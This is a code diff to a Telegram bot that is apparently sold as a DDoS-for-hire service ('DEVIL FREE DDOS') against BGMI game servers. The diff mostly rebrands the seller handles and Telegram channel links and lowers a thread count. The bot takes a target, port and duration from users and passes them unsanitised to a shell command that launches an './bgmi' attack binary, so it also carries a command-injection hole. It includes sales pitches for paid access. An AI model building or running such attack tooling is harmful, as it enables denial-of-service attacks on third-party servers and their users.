@@ -213,7 +213,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@Pathan6654"
+    response = f"{username}, 🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔗𝐏𝐨𝐫𝐭: {port}\n⏰𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -247,7 +247,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 100"
+                full_command = f"./bgmi {target} {port} {time} 10"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -292,8 +292,8 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @Pathan6654
-Official Channel :- https://t.me/+DRJ-_PlwYX84YTE1
+Buy From :- @Rahman4556
+Official Channel :- https://t.me/+NIa_tTtt5uk4YjRl
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -310,7 +310,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to DEVIL FREE DDOS🚀, {user_name}! ⚠️ PAID BHI SASTA HAI KHARID LO ABHI .
 🤖Try To Run This Command : /help 
-✅Join :- https://t.me/+S3EDuNxPM2Q2YjNl'''
+✅Join :- https://t.me/+NIa_tTtt5uk4YjRl'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
